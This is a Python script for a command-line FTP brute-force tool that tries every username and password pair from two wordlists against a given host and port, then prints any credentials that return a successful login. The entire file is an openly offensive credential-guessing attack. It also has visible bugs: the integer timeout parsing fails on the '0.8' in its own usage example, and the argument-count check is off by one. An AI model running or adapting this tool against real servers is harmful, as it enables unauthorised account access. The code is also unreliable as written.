import socket
import sys
import os
a= sys.argv


class Log:

    def start(self, message):
        print(f"\033[34m[*] {message}\033[0m")

    def success(self, message):
        print(f"\033[32m[+] {message}\033[0m")

    def error(self, message):
        print(f"\033[31m[-] {message}\033[0m")

    def warning(self, message):
        print(f"\033[33m[!] {message}\033[0m")

    def info(self, message):
        print(f"\033[36m[*] {message}\033[0m")

    def runing(self, text):
        print(f"\033[36m[~] {text}\033[0m")



if len(a)<5:
    print("run python3 ftpc.py <host> <port> <userWordList> <PassWordList> <timeout in seconds> ")
    print("example python3 ftpfire.py 192.168.1.103 2121 ./users.txt ./passwords.txt 0.8")
    sys.exit()



def banner():
    t = """ \033[1;32m
                    ________________     ______________  ______
                   / ____/_  __/ __ \   / ____/  _/ __ \/ ____/
                  / /_    / / / /_/ /  / /_   / // /_/ / __/   
                 / __/   / / / ____/  / __/ _/ // _, _/ /___   
                /_/     /_/ /_/      /_/   /___/_/ |_/_____/   
                                             
                                           \033[31m by MD.Bayazid
				SSC Batch 2025
                                Email: bayazid.mtu@gmail.com  
                                             
                                             """
    os.system('cls' if os.name =='nt' else "clear")
    print(t)



banner()
host = a[1]
port = int(a[2])
timeout = int(a[5])
userWpath = a[3]
passWpath = a[4]

loger = Log()

if not os.path.exists(userWpath) :
    loger.error(f"File {userWpath} not found!")
    sys.exit()
elif not  os.path.exists(passWpath):
    loger.error(f"File {passWpath} not found!")
    sys.exit()

loger.info(f"TERGET: {host}")
loger.info(f"TERGET PORT: {port}")
loger.info(f"Username list: {userWpath}")
loger.info(f"Password list : {passWpath}")
loger.info(r"Timeout set: {timeout}seconds!")

loger.start(f"Running brute-force attack...... ")

def login(server:socket.socket , user, passw):

    server.send(f"USER {user}\r\n".encode())

    server.recv(1024).decode()
    server.send(f"PASS {passw}\r\n".encode())
    stat = server.recv(1024).decode()

    if '230' in stat :
        print('\n')
        loger.success("Access Granted!")
        loger.info(f"USER: {user}")
        loger.info(f"PASSWORD: {passw}")
        return True

def main():
    with open(userWpath,'r') as users:

            t = False
            while not t :

                user = users.readline().replace("\n",'')
                if not user:
                    break
                else:
                    with open(passWpath, 'r') as passs:
                        while True:
                            paswd = passs.readline().replace("\n",'')
                            if not paswd:
                                break
                            else:
                                try:
                                    s=  socket.socket()
                                    s.connect((host, port))
                                    s.recv(1024)
                                    s.settimeout(timeout)
                                    print(f"\033[36m[~] Trying with USER: {user} PASS: {paswd}\033[0m " , end='\r')
                                    st = login(s , user , paswd)

                                    if st:
                                        t = True
                                        s.close()
                                        break

                                    else:
                                        s.close()
                                        continue
                                except:
                                    s.close()
                                    continue

if __name__=="__main__":
    main()
